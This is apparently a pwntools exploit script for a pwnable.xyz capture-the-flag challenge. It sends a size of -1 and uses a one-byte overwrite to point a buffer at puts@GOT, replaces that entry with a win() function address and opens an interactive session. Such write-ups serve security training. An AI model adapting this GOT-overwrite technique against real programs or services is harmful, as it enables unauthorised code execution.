from pwn import *

LOCAL = False

if LOCAL:
    r = process('./release/challenge')
else:
    r = remote('svc.pwnable.xyz', 30036)

sla = r.sendlineafter

def fill_handles(sentence, answer):
    sla('> ', '3')
    sla('> ', str(sentence))
    sla('> ', str(answer))

def save_progress(data=None):
    sla('> ', '5')
    if data:
        r.sendline(data)

puts_got = 0x610b10
win = 0x4008e8

save_progress()
sla('Size: ', '-1') 
r.send('\x00') # address of reserve (0x610ec0) in buf

for i in range(5):
    fill_handles(4, 0)
fill_handles(3, 0) # overwrite last 1byte of buf with '\x00' (0x610e00)

save_progress(b'A' * 0xa0 + p64(puts_got)) # overwrite buf with puts@GOT
save_progress(p64(win)) # puts@GOT -> win()

sla('> ', '6') # call puts() -> win()

r.interactive()